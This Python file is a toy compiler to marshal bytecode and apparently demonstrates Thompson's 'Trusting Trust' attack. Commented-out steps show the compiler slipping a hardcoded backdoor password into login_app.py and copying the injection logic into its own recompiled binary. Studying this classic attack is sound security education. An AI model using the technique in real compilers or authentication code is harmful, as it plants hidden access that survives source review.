#!/usr/local/bin/python3
"""
The compiler is really the code object on disk as compiler.marshal, and this is
the source used to generate that "binary".
"""

import marshal
import sys
import inspect


def build( inPath, outPath ):
    print( 'Building %s...' %inPath )
    with open( inPath, 'r' ) as f:
        source = ''
        for line in f.readlines():

            # START SHADINESS

            # STEP 2
            # The obviously malicious code we're inspired to hide
            # Not necessary to achieve final result
            #if 'password ==' in line and 'login_app.py' == inPath:
            #    line = '    if password == \'please\' or password == \'backdoor\':\n'

            # STEP 3
            # Include this block and recompile for next step of Trusting Trust
            #comp_line = r'''
            #comp_line = r"REPLACE"

            #if \'password ==\' in line and \'login_app.py\' == inPath:
            #    line = '    if password == \\'please\\' or password == \\'backdoor\\':\\n'
            #    source += line
            #    continue
            #if \'for line in f.readlines\' in line and \'thisword\' not in line:
            #    comp_str = bytes( comp_line, 'utf-8' ).decode( 'unicode_escape' )
            #    line += comp_str.replace( '"REPLACE"', '"""'+repr( comp_line )+'"""', 1 )
            #    source += line
            #    continue

            #'''

            #if 'for line in f.readlines' in line and 'thisword' not in line:
            #    comp_str = bytes( comp_line, 'utf-8' ).decode( 'unicode_escape' )
            #    line += comp_str.replace( '"REPLACE"', '"""'+comp_line+'"""', 1 )
            #    source += line
            #    continue

            # STEP 4
            # Disable all the malicious code, recompile, bug persists.

            # END SHADINESS

            source += line
    co = compile( source, inPath, 'exec' )
    with open( outPath, 'wb' ) as f:
        marshal.dump( co, f )
    print( 'Done' )

def getOutputFile( inPath ):
    return inPath[:-3] + '.marshal'

def printUsage():
    print( 'Usage: compiler.py input' )


""" Need to know if called indirectly through the marshal'd object. """
caller = inspect.stack()
if len( caller ) == 1:
    """ Assume called directly. """
    if len( sys.argv ) < 2:
        printUsage()
    else:
        build( sys.argv[1], getOutputFile( sys.argv[1] ) )
else:
    """ Assume called via runner.py """
    if len( sys.argv ) < 3:
        """ Because executed from runner.py, arg to compiler will actually be
        third element. If running something else, ignore the complaining. """
        printUsage()
    else:
        build( sys.argv[2], getOutputFile( sys.argv[2] ) )
